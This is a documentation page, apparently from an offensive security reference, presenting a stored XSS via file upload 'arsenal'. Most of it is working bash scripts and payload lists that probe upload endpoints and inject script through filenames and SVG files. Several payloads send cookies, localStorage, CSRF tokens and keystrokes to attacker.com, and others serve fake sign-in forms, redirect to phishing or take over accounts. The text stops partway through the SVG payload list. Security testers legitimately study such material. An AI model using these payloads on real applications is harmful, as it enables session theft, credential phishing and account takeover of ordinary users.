---
title: Stored XSS via File Upload
description: Stored XSS via File Upload — Complete Arsenal of Payloads, Techniques & Exploitation Methods
navigation:
  icon: i-lucide-code-xml
  title: Stored XSS via Upload
---

## Stored XSS via File Upload


Stored XSS via file upload is the most impactful client-side vulnerability achievable through upload functionality. The payload **persists on the server** and fires in **every victim's browser** who views the content — no crafted link required, no user interaction beyond normal browsing. Every profile view, gallery browse, file listing display, notification render, or admin panel access triggers the attacker's JavaScript. The attack surface spans filenames, file content (SVG, HTML, XML), image metadata (EXIF, IPTC, XMP), Content-Type mismatches, and content sniffing gaps.

::note
**You do NOT need server-side code execution for this attack.** No PHP shell, no JSP, no ASPX. The payload is JavaScript that runs in the victim's browser. This works even when the server has perfect server-side upload validation — because the vulnerability is in how the application **displays** upload-related data, not how it **processes** the file.
::

---

## Complete Attack Surface Map

::accordion
  :::accordion-item{icon="i-lucide-target" label="Filename Injection Points"}
  Every location where the application renders an uploaded filename is a potential XSS vector:

  - File listing pages (`<td>FILENAME</td>`)
  - Download links (`<a href="...">FILENAME</a>`)
  - Image alt text (`<img alt="FILENAME">`)
  - Tooltip attributes (`<div title="FILENAME">`)
  - Breadcrumb navigation (`Home > Files > FILENAME`)
  - Activity/audit logs (`User uploaded FILENAME`)
  - Notification emails (`New file: FILENAME`)
  - Social sharing cards (`<meta og:title="FILENAME">`)
  - JavaScript variables (`var file = "FILENAME"`)
  - JSON API responses (`{"name": "FILENAME"}`)
  - Search results highlighting
  - Comment/share dialogs
  - Admin file manager panels
  - Error messages (`Could not process FILENAME`)
  - PDF/report generation with filename
  :::

  :::accordion-item{icon="i-lucide-target" label="File Content Injection Points"}
  Files served inline (without `Content-Disposition: attachment`) can contain executable content:

  - **SVG** — Full JavaScript support via `<script>`, event handlers, `<foreignObject>`
  - **HTML/HTM** — Direct browser rendering with JS execution
  - **XHTML** — XML-based HTML with script support
  - **XML** — XSLT transformations can produce HTML with JS
  - **MHTML** — MIME HTML with embedded scripts
  - **HTA** — HTML Application (Windows, elevated permissions)
  - **PDF** — JavaScript in PDF actions (limited browser support)
  - **Markdown** — If rendered as HTML without sanitization
  - **CSV** — If previewed in HTML table without encoding
  - **Text** — Content sniffing may render as HTML
  - **JSON** — If rendered as HTML in some viewers
  - **RSS/Atom** — XML with potential script content
  :::

  :::accordion-item{icon="i-lucide-target" label="Metadata Injection Points"}
  Applications that read and display file metadata:

  - **EXIF Comment** — Photo description in galleries
  - **EXIF Artist** — Photographer credit display
  - **EXIF Copyright** — Rights information panel
  - **EXIF ImageDescription** — Alt text, captions
  - **EXIF Make/Model** — Camera info display
  - **EXIF Software** — Editor information
  - **EXIF UserComment** — Extended comments
  - **EXIF XPTitle/XPComment/XPAuthor** — Windows properties
  - **IPTC Caption/Headline** — News/stock photo metadata
  - **XMP Title/Description/Creator** — Adobe metadata
  - **ID3 Tags** — Audio file artist, title, album
  - **PDF Title/Author/Subject** — Document properties
  - **DOCX/XLSX Author/Title** — Office document properties
  :::

  :::accordion-item{icon="i-lucide-target" label="Header & MIME Injection Points"}
  Response-level vectors:

  - Missing `X-Content-Type-Options: nosniff`
  - HTML content served as `text/html` despite image extension
  - Missing `Content-Disposition: attachment`
  - `text/plain` without nosniff (IE renders as HTML)
  - `application/octet-stream` without nosniff (browsers sniff)
  - No Content-Type header at all (always sniffed)
  - CORS `Access-Control-Allow-Origin: *` on upload domains
  - CSP `script-src 'self'` with same-origin uploads
  :::
::

---

## Phase 1 — Reconnaissance & Injection Point Discovery

### Systematic Display Point Detection

::tabs
  :::tabs-item{icon="i-lucide-search" label="Upload Marker & Search"}
  ```bash
  TARGET="https://target.com"
  UPLOAD_URL="${TARGET}/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  TS=$(date +%s)

  echo "═══ XSS Injection Point Discovery ═══"

  # Create valid test image
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/marker.jpg

  # ── Step 1: Upload with unique marker in filename ──
  MARKER="XSSMARKER${TS}XSSEND"

  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/marker.jpg;filename=${MARKER}.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" > /dev/null

  # ── Step 2: Upload with EXIF markers ──
  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'red').save('/tmp/exif_marker.jpg','JPEG',quality=95)" 2>/dev/null
  exiftool \
    -Comment="EXIFMARKER_COMMENT_${TS}" \
    -ImageDescription="EXIFMARKER_DESC_${TS}" \
    -Artist="EXIFMARKER_ARTIST_${TS}" \
    -Copyright="EXIFMARKER_COPYRIGHT_${TS}" \
    -Make="EXIFMARKER_MAKE_${TS}" \
    -Model="EXIFMARKER_MODEL_${TS}" \
    -overwrite_original /tmp/exif_marker.jpg 2>/dev/null

  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/exif_marker.jpg;filename=exif_test_${TS}.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" > /dev/null

  # ── Step 3: Search every application page for markers ──
  echo ""
  echo "─── Searching Application Pages ───"

  PAGES=(
      "/" "/profile" "/gallery" "/photos" "/media" "/files"
      "/uploads" "/dashboard" "/admin" "/admin/media" "/admin/files"
      "/user/files" "/user/images" "/user/photos" "/user/documents"
      "/api/files" "/api/media" "/api/photos" "/api/uploads"
      "/settings" "/activity" "/notifications" "/feed"
      "/search" "/explore" "/discover" "/trending"
      "/messages" "/chat" "/inbox" "/sent"
      "/reports" "/analytics" "/logs" "/audit"
      "/team" "/workspace" "/shared" "/public"
  )

  for page in "${PAGES[@]}"; do
      BODY=$(curl -s "${TARGET}${page}" -H "Cookie: $COOKIE" --max-time 5 2>/dev/null)
      [ -z "$BODY" ] && continue

      # Check filename marker
      if echo "$BODY" | grep -q "$MARKER"; then
          echo ""
          echo "[+] FILENAME displayed at: ${page}"

          # Determine rendering context
          LINE=$(echo "$BODY" | grep -n "$MARKER" | head -1)
          LINENUM=$(echo "$LINE" | cut -d: -f1)
          CONTEXT=$(echo "$LINE" | cut -d: -f2-)

          if echo "$CONTEXT" | grep -P ">[^<]*${MARKER}" > /dev/null 2>&1; then
              echo "    Context: HTML TEXT — inject <script> or <img onerror>"
          fi
          if echo "$CONTEXT" | grep -P '(alt|title|value|placeholder|content)="[^"]*'"$MARKER" > /dev/null 2>&1; then
              echo "    Context: HTML ATTRIBUTE — inject \" onfocus=alert(1)"
          fi
          if echo "$CONTEXT" | grep -P "'[^']*${MARKER}" > /dev/null 2>&1; then
              echo "    Context: SINGLE-QUOTED — inject ' onfocus=alert(1)"
          fi
          if echo "$CONTEXT" | grep -P "(var|let|const|=)\s*['\"].*${MARKER}" > /dev/null 2>&1; then
              echo "    Context: JAVASCRIPT STRING — inject \";alert(1);//"
          fi
          if echo "$CONTEXT" | grep -P "\"[^\"]*${MARKER}[^\"]*\"" > /dev/null 2>&1; then
              echo "    Context: JSON VALUE — inject \",\"x\":\"<img onerror>"
          fi
      fi

      # Check EXIF markers
      for field in COMMENT DESC ARTIST COPYRIGHT MAKE MODEL; do
          if echo "$BODY" | grep -q "EXIFMARKER_${field}_${TS}"; then
              echo "[+] EXIF ${field} displayed at: ${page}"
          fi
      done
  done

  rm -f /tmp/marker.jpg /tmp/exif_marker.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Security Header Analysis"}
  ```bash
  TARGET="https://target.com"

  echo "═══ Upload Serving Security Analysis ═══"

  # ── Check main domain headers ──
  echo "─── Main Domain ───"
  curl -sI "$TARGET" | grep -iE "x-content-type-options|content-security-policy|x-frame-options|content-type" | head -10

  CSP=$(curl -sI "$TARGET" | grep -i "content-security-policy" | tr -d '\r')
  if [ -z "$CSP" ]; then
      echo "  [!!!] NO CSP — all scripts execute freely"
  else
      echo "$CSP" | grep -qi "script-src.*'self'" && echo "  [!] script-src 'self' — same-origin upload XSS bypasses CSP"
      echo "$CSP" | grep -qi "'unsafe-inline'" && echo "  [!] unsafe-inline — inline scripts allowed"
      echo "$CSP" | grep -qi "blob:" && echo "  [!] blob: allowed — blob URL XSS possible"
      echo "$CSP" | grep -qi "data:" && echo "  [!] data: allowed — data URI XSS possible"
  fi

  # ── Check upload serving paths ──
  echo ""
  echo "─── Upload Directories ───"

  for path in /uploads/ /images/ /media/ /files/ /static/ /content/ /assets/ /user-content/ /attachments/ /storage/ /public/uploads/; do
      HEADERS=$(curl -sI "${TARGET}${path}" --max-time 3 2>/dev/null)
      STATUS=$(echo "$HEADERS" | head -1 | awk '{print $2}')
      [ "$STATUS" = "404" ] || [ -z "$STATUS" ] && continue

      NOSNIFF=$(echo "$HEADERS" | grep -i "x-content-type-options" | tr -d '\r')
      CT=$(echo "$HEADERS" | grep -i "^content-type:" | head -1 | tr -d '\r')
      CD=$(echo "$HEADERS" | grep -i "content-disposition" | head -1 | tr -d '\r')
      XCSP=$(echo "$HEADERS" | grep -i "content-security-policy" | head -1 | tr -d '\r')

      echo "  [${STATUS}] ${path}"
      echo "       nosniff:     ${NOSNIFF:-❌ MISSING}"
      echo "       CT:          ${CT:-NOT SET}"
      echo "       disposition: ${CD:-inline (browser renders)}"
      [ -n "$XCSP" ] && echo "       CSP:         ${XCSP:0:60}..."

      # Risk assessment
      [ -z "$NOSNIFF" ] && echo "       ⚠ Content sniffing XSS possible"
      [ -z "$CD" ] && echo "       ⚠ Files render inline (SVG/HTML XSS)"
      echo "$CT" | grep -qi "text/html" && echo "       ⚠ Served as HTML — direct XSS"
  done

  # ── Check CDN/external domains ──
  echo ""
  echo "─── CDN/External Upload Domains ───"
  PAGE=$(curl -s "$TARGET" 2>/dev/null)
  EXTERNAL=$(echo "$PAGE" | grep -oP 'https?://[^/"\s]+' | sort -u | grep -viE "$(echo "$TARGET" | grep -oP '//[^/]+')" | head -20)
  for domain in $EXTERNAL; do
      CDN_NOSNIFF=$(curl -sI "$domain/" --max-time 3 2>/dev/null | grep -i "x-content-type-options")
      [ -n "$(curl -sI "$domain/" --max-time 3 2>/dev/null | head -1)" ] && \
          echo "  ${domain}: ${CDN_NOSNIFF:-❌ nosniff MISSING}"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Upload Format Acceptance Probe"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ XSS-Relevant Format Acceptance ═══"

  # Test every format that can carry XSS
  XSS_CONTENT='<script>alert(1)</script>'
  echo "$XSS_CONTENT" > /tmp/xss_probe.txt

  # SVG
  echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > /tmp/xss_probe.svg

  echo "─── Direct XSS Formats ───"
  for ext_ct in \
      "svg:image/svg+xml" \
      "html:text/html" \
      "htm:text/html" \
      "xhtml:application/xhtml+xml" \
      "xml:text/xml" \
      "xml:application/xml" \
      "mhtml:message/rfc822" \
      "hta:application/hta" \
      "shtml:text/html"; do

      EXT=$(echo "$ext_ct" | cut -d: -f1)
      CT=$(echo "$ext_ct" | cut -d: -f2-)

      if [ "$EXT" = "svg" ]; then
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/xss_probe.svg;filename=test.${EXT};type=${CT}" \
            -H "Cookie: $COOKIE" 2>/dev/null)
      else
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/xss_probe.txt;filename=test.${EXT};type=${CT}" \
            -H "Cookie: $COOKIE" 2>/dev/null)
      fi
      [ "$STATUS" = "200" ] && echo "[+] .${EXT} (${CT}) ACCEPTED"
  done

  echo ""
  echo "─── Content Sniffing Vectors ───"
  for ext_ct in \
      "jpg:image/jpeg" \
      "png:image/png" \
      "gif:image/gif" \
      "bmp:image/bmp" \
      "txt:text/plain" \
      "csv:text/csv" \
      "json:application/json" \
      "pdf:application/pdf" \
      "bin:application/octet-stream" \
      "dat:application/octet-stream"; do

      EXT=$(echo "$ext_ct" | cut -d: -f1)
      CT=$(echo "$ext_ct" | cut -d: -f2-)

      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/xss_probe.txt;filename=test.${EXT};type=${CT}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] HTML as .${EXT} (${CT}) ACCEPTED — check sniffing"
  done

  echo ""
  echo "─── SVG with Non-SVG Content-Type ───"
  for ct in "image/jpeg" "image/png" "application/octet-stream" "text/plain" "text/xml"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/xss_probe.svg;filename=chart.svg;type=${ct}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] SVG with CT:${ct} ACCEPTED"
  done

  echo ""
  echo "─── SVG with Image Extension ───"
  for ext in jpg png gif bmp webp; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/xss_probe.svg;filename=image.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] SVG as .${ext} ACCEPTED — relies on content sniffing"
  done

  rm -f /tmp/xss_probe.txt /tmp/xss_probe.svg
  ```
  :::
::

---

## Phase 2 — Payload Arsenal

### Filename XSS — 100+ Payloads

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="HTML Text Context (50 payloads)"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/x.jpg

  echo "═══ Filename XSS — HTML Text Context ═══"
  echo "[*] For: <td>FILENAME</td> or <span>FILENAME</span>"

  PAYLOADS=(
      # Script tag variants
      '<script>alert(document.domain)</script>.jpg'
      '<script>alert(1)</script>.jpg'
      '<script src=https://attacker.com/xss.js></script>.jpg'
      '<script>fetch("https://attacker.com/"+document.cookie)</script>.jpg'
      '<ScRiPt>alert(1)</ScRiPt>.jpg'
      '<script >alert(1)</script >.jpg'
      '<script/src=//attacker.com/x.js>.jpg'

      # IMG onerror variants
      '<img src=x onerror=alert(document.domain)>.jpg'
      '<img/src=x/onerror=alert(1)>.jpg'
      '<img src=x onerror="fetch(`https://attacker.com/?c=${document.cookie}`)">.jpg'
      '<img src=x onerror=alert`1`>.jpg'
      '<iMg sRc=x oNeRrOr=alert(1)>.jpg'
      '<img src=x onerror=alert(String.fromCharCode(88,83,83))>.jpg'

      # SVG onload
      '<svg onload=alert(document.domain)>.jpg'
      '<svg/onload=alert(1)>.jpg'
      '<SVG/ONLOAD=alert(1)>.jpg'
      '<svg onload="fetch(`//attacker.com/?${document.cookie}`)">.jpg'
      '<svg><script>alert(1)</script></svg>.jpg'

      # Event handlers that auto-fire
      '<body onload=alert(1)>.jpg'
      '<input autofocus onfocus=alert(1)>.jpg'
      '<input onfocus=alert(1) autofocus>.jpg'
      '<details open ontoggle=alert(1)>.jpg'
      '<marquee onstart=alert(1)>.jpg'
      '<video src=x onerror=alert(1)>.jpg'
      '<audio src=x onerror=alert(1)>.jpg'
      '<video autoplay onloadstart=alert(1)><source>.jpg'
      '<object data=javascript:alert(1)>.jpg'
      '<embed src=javascript:alert(1)>.jpg'
      '<iframe src=javascript:alert(1)>.jpg'
      '<isindex action=javascript:alert(1)>.jpg'
      '<select autofocus onfocus=alert(1)>.jpg'
      '<textarea autofocus onfocus=alert(1)>.jpg'
      '<keygen autofocus onfocus=alert(1)>.jpg'
      '<meter onmouseover=alert(1) value=2 min=0 max=10>.jpg'
      '<progress onmouseover=alert(1) value=2 max=10>.jpg'

      # Nested/complex
      '<math><mtext><table><mglyph><svg onload=alert(1)>>.jpg'
      '<math><mtext><img src=x onerror=alert(1)></mtext></math>.jpg'
      '<x contenteditable onblur=alert(1)>click me</x>.jpg'
      '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>.jpg'
      '<div style="width:100px;height:100px;overflow:auto" onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>.jpg'

      # Base64 encoded payload
      '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>.jpg'

      # Unicode bypass
      '<img src=x onerror=\u0061lert(1)>.jpg'
      '<script>\u0061lert(1)</script>.jpg'

      # Double encoding
      '%3Cscript%3Ealert(1)%3C/script%3E.jpg'
      '&lt;script&gt;alert(1)&lt;/script&gt;.jpg'

      # Null byte variants
      '<script>alert(1)</script>%00.jpg'
      '<img src=x onerror=alert(1)>%00.jpg'

      # Template literal
      '<img src=x onerror=alert`document.domain`>.jpg'
  )

  ACCEPTED=0
  for fname in "${PAYLOADS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/x.jpg;filename=${fname};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      if [ "$STATUS" = "200" ]; then
          ACCEPTED=$((ACCEPTED + 1))
          echo "[+] ${fname:0:70}..."
      fi
  done

  echo ""
  echo "[*] ${ACCEPTED}/${#PAYLOADS[@]} filename payloads accepted"

  rm -f /tmp/x.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Attribute Context (30 payloads)"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/x.jpg

  echo "═══ Filename XSS — Attribute Context ═══"
  echo '[*] For: <img alt="FILENAME"> or <a title="FILENAME">'

  ATTR_PAYLOADS=(
      # Break double-quoted attribute
      '" onmouseover="alert(document.domain)" x=".jpg'
      '" onfocus="alert(1)" autofocus tabindex="1" x=".jpg'
      '" onclick="alert(1)" x=".jpg'
      '" onmouseenter="alert(1)" x=".jpg'
      '" ondblclick="alert(1)" x=".jpg'
      '" onerror="alert(1)" src="x" x=".jpg'
      '" style="animation-name:x" onanimationstart="alert(1)" x=".jpg'
      '" autofocus onfocus="alert(1).jpg'
      '"><img src=x onerror=alert(1)><".jpg'
      '"><svg onload=alert(1)><".jpg'
      '"><script>alert(1)</script><".jpg'
      '"><details open ontoggle=alert(1)><".jpg'
      '"><body onload=alert(1)><".jpg'

      # Break single-quoted attribute
      "' onmouseover='alert(1)' x='.jpg"
      "' onfocus='alert(1)' autofocus x='.jpg"
      "' onclick='alert(1)' x='.jpg"
      "'/><img src=x onerror=alert(1)><'.jpg"
      "'/><svg onload=alert(1)><'.jpg"

      # Inject new attribute with event
      '" onmouseover=alert(1) x=".jpg'
      '" onfocus=alert(1) autofocus x=".jpg'
      '" onblur=alert(1) autofocus x=".jpg'
      '" onauxclick=alert(1) x=".jpg'
      '" oncontextmenu=alert(1) x=".jpg'

      # JavaScript URI in href context
      'javascript:alert(1)//.jpg'
      'javascript:alert(document.domain)//.jpg'
      'java&#x73;cript:alert(1)//.jpg'
      'java%0ascript:alert(1)//.jpg'
      'java%0dscript:alert(1)//.jpg'
      'java%09script:alert(1)//.jpg'
  )

  for fname in "${ATTR_PAYLOADS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/x.jpg;filename=${fname};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${fname:0:70}..."
  done

  rm -f /tmp/x.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="JavaScript & JSON Context (20 payloads)"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/x.jpg

  echo '═══ Filename XSS — JavaScript/JSON Context ═══'
  echo '[*] For: var file = "FILENAME" or {"name":"FILENAME"}'

  JS_PAYLOADS=(
      # Break double-quoted JS string
      '";alert(document.domain);//.jpg'
      '";alert(1);//.jpg'
      '"+alert(1)+"x.jpg'
      '";alert(document.domain);var x=".jpg'
      '\\";alert(1);//.jpg'
      '"};alert(1);{"x":".jpg'

      # Break single-quoted JS string
      "';alert(1);//.jpg"
      "'+alert(1)+'x.jpg"
      "';alert(document.domain);//.jpg"

      # Template literal
      '`${alert(1)}`.jpg'
      '${alert(document.domain)}.jpg'

      # JSON breakout
      '","evil":"<img src=x onerror=alert(1)>","x":".jpg'
      '","__proto__":{"x":"<img src=x onerror=alert(1)>"},"x":".jpg'

      # Unicode escapes
      '\u003cscript\u003ealert(1)\u003c/script\u003e.jpg'
      '\x3cscript\x3ealert(1)\x3c/script\x3e.jpg'

      # Expression evaluation
      '"-alert(1)-".jpg'
      "'-alert(1)-'.jpg"

      # Constructor trick
      '";[].constructor.constructor("alert(1)")();//.jpg'
      "';[].constructor.constructor('alert(1)')();//.jpg"

      # Line terminator injection
      '"\nalert(1)\n".jpg'
  )

  for fname in "${JS_PAYLOADS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/x.jpg;filename=${fname};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${fname:0:70}..."
  done

  rm -f /tmp/x.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Weaponized Filename Payloads"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/x.jpg

  echo "═══ Weaponized Filename Payloads ═══"

  # Cookie stealer
  curl -s -o /dev/null -w "[%{http_code}] cookie stealer\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">.jpg" \
    -H "Cookie: $COOKIE"

  # LocalStorage stealer
  curl -s -o /dev/null -w "[%{http_code}] localStorage stealer\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"fetch('https://attacker.com/ls?d='+btoa(JSON.stringify(localStorage)))\">.jpg" \
    -H "Cookie: $COOKIE"

  # Keylogger
  curl -s -o /dev/null -w "[%{http_code}] keylogger\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"document.onkeypress=e=>fetch('https://attacker.com/k?k='+e.key)\">.jpg" \
    -H "Cookie: $COOKIE"

  # Session fixation
  curl -s -o /dev/null -w "[%{http_code}] session fixation\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"document.cookie='session=attacker_session;path=/'\">.jpg" \
    -H "Cookie: $COOKIE"

  # Redirect to phishing
  curl -s -o /dev/null -w "[%{http_code}] redirect\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"location='https://attacker.com/phish?origin='+location.origin\">.jpg" \
    -H "Cookie: $COOKIE"

  # DOM manipulation (deface)
  curl -s -o /dev/null -w "[%{http_code}] deface\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"document.body.innerHTML='<h1>Hacked</h1>'\">.jpg" \
    -H "Cookie: $COOKIE"

  # External script load (most dangerous)
  curl -s -o /dev/null -w "[%{http_code}] ext script\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<script src=https://attacker.com/evil.js></script>.jpg" \
    -H "Cookie: $COOKIE"

  # CSRF token theft
  curl -s -o /dev/null -w "[%{http_code}] CSRF theft\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"fetch('/api/profile').then(r=>r.text()).then(t=>fetch('https://attacker.com/csrf?t='+t.match(/csrf_token.*?value=.([^']+)/)[1]))\">.jpg" \
    -H "Cookie: $COOKIE"

  # Account takeover (change email)
  curl -s -o /dev/null -w "[%{http_code}] account takeover\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/x.jpg;filename=<img src=x onerror=\"fetch('/api/profile',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'}),credentials:'include'})\">.jpg" \
    -H "Cookie: $COOKIE"

  rm -f /tmp/x.jpg
  ```
  :::
::

---

### SVG XSS — Complete Payload Collection

::tabs
  :::tabs-item{icon="i-lucide-image" label="SVG Script & Event Payloads"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  mkdir -p svg_payloads

  # ── 1-5: Script tag variants ──
  cat > svg_payloads/01_script_basic.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
  EOF

  cat > svg_payloads/02_script_type.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">alert(1)</script></svg>
  EOF

  cat > svg_payloads/03_script_external.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><script xlink:href="https://attacker.com/x.js"/></svg>
  EOF

  cat > svg_payloads/04_script_cdata.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[alert(document.domain)]]></script></svg>
  EOF

  cat > svg_payloads/05_script_entities.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>
  EOF

  # ── 6-10: Event handler variants ──
  cat > svg_payloads/06_onload.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)" width="100" height="100"><circle cx="50" cy="50" r="40" fill="blue"/></svg>
  EOF

  cat > svg_payloads/07_onload_fetch.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/?c='+document.cookie)"><rect width="100" height="100" fill="red"/></svg>
  EOF

  cat > svg_payloads/08_animate_begin.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/></svg>
  EOF

  cat > svg_payloads/09_animate_end.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><animate onend="alert(1)" attributeName="x" dur="1ms"/></svg>
  EOF

  cat > svg_payloads/10_set.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/><rect width="200" height="200" fill="yellow"/></svg>
  EOF

  # ── 11-15: ForeignObject (full HTML) ──
  cat > svg_payloads/11_foreign_script.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script></body></foreignObject></svg>
  EOF

  cat > svg_payloads/12_foreign_cookie.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><script>fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href,localStorage:JSON.stringify(localStorage)}),mode:'no-cors'})</script></body></foreignObject></svg>
  EOF

  cat > svg_payloads/13_foreign_phish.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml" style="margin:0"><div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;display:flex;align-items:center;justify-content:center"><div style="width:400px;padding:40px;box-shadow:0 4px 20px rgba(0,0,0,.1);border-radius:12px;text-align:center"><h2>Session Expired</h2><p style="color:#666">Please sign in again</p><form action="https://attacker.com/phish" method="POST"><input name="email" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px"/><br/><input name="pass" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px"/><br/><button style="width:100%;padding:12px;background:#0066cc;color:white;border:none;border-radius:4px;cursor:pointer">Sign In</button></form></div></div></body></foreignObject></svg>
  EOF

  cat > svg_payloads/14_foreign_keylog.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10){navigator.sendBeacon('https://attacker.com/keys',JSON.stringify({k:k,u:location.href}));k=''}}"><rect width="1" height="1" fill="transparent"/></svg>
  EOF

  cat > svg_payloads/15_foreign_iframe.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(document.domain)" style="width:0;height:0;border:0"/></body></foreignObject></svg>
  EOF

  # ── 16-20: Advanced bypass techniques ──
  cat > svg_payloads/16_xlink_data.svg << 'EOF'
